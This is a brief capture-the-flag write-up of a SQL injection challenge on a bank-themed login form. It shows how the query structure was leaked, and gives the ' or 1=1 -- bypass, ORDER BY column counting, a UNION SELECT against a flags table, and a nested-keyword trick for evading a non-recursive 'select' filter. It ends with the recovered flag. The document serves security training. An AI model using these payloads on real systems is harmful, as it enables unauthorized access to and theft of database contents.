# Bank - SQLI

A clue is given to look at the flags table
`Try looking in the flags table. Columns: flag, value`

Putting in any input into the login form spits out the query we are manipulating.

`SELECT * FROM users WHERE username='myInput' AND password='myInput';`

Where `myInput` is the values we insert into the username and password field.

The first step is to try and break the query/find the database language we are using.
Adding in `'a` in both fields give 

`Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in /var/www/html/login.php on line 50`

mysql uses `--` as its comment syntax.

We can now leak the users table through inputting 

`' or 1=1 -- `

in the username.

The next step is to figure out the number of columns that we take from the users table

We can do that through trial and error, by using `ORDER BY 1-- ` to our existing leak.

The last working query is 

`' or 1=1 ORDER BY 3 -- `

Indicating that there are 3 columns in our first query.

We then UNION our second query for flags while match the number of columns

`' or 1=1 union SELECT flag, value, null from flags;-- `

BUT we find that our SELECT disappears.

`SELECT * FROM users WHERE username='' or 1=1 union flag, value, null from flags;-- ' AND password='1';`

We can conclude that there is some filtering happening.

We test if the filtering is recursive

`' or 1=1 union SELselectECT flag, value, null from flags;-- `

And its not which gives us our flag.
flag{3min3m_kind@_wa$hed}